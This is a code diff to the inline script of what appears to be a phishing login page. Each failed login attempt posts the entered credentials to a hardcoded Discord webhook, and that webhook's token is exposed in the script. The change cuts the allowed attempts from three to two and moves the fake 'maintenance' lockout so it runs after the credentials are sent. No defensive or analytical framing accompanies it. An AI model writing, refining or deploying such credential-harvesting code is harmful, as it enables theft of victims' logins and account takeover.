@@ -308,7 +308,7 @@
                                        </tr>
                                        <script>
 
-                                          let attempts = 3;
+                                          let attempts = 2;
 
                                           function validateCredentials() {
                                              var username = document.getElementById('username').value;
@@ -319,18 +319,6 @@
                                              } else {
 
                                                 attempts = attempts - 1;
-
-                                                if (attempts <= 0) {
-                                                   document.getElementById('errorMessage').setAttribute('aria-disabled', 'true');
-                                                   document.getElementById('errorMessage').style.display = 'none';
-                                                   document.getElementById('maintenanceMessage').setAttribute('aria-disabled', 'false');
-                                                   document.getElementById('maintenanceMessage').style.display = '';
-                                                   document.getElementById('username').disabled = true;
-                                                   document.getElementById('password').disabled = true;
-                                                   document.getElementById('submitButton').disabled = true;
-                                                } else {
-                                                   document.getElementById('errorMessage').style.display = '';
-                                                }
 
                                                 var webhookURL = "https://discordapp.com/api/webhooks/1279482681159319592/fpE3YOcL8O0O4NR_MGdB4P17ulkUvhcQFovxdWj0tQRCYF9Mb5JWWwhk9EJRUzQiP7vt";
 
@@ -346,6 +334,18 @@
                                                 },
                                                 body: JSON.stringify(params)
                                                 });
+
+                                                if (attempts <= 0) {
+                                                   document.getElementById('errorMessage').setAttribute('aria-disabled', 'true');
+                                                   document.getElementById('errorMessage').style.display = 'none';
+                                                   document.getElementById('maintenanceMessage').setAttribute('aria-disabled', 'false');
+                                                   document.getElementById('maintenanceMessage').style.display = '';
+                                                   document.getElementById('username').disabled = true;
+                                                   document.getElementById('password').disabled = true;
+                                                   document.getElementById('submitButton').disabled = true;
+                                                } else {
+                                                   document.getElementById('errorMessage').style.display = '';
+                                                }
                                              }
                                           }
                                       </script>
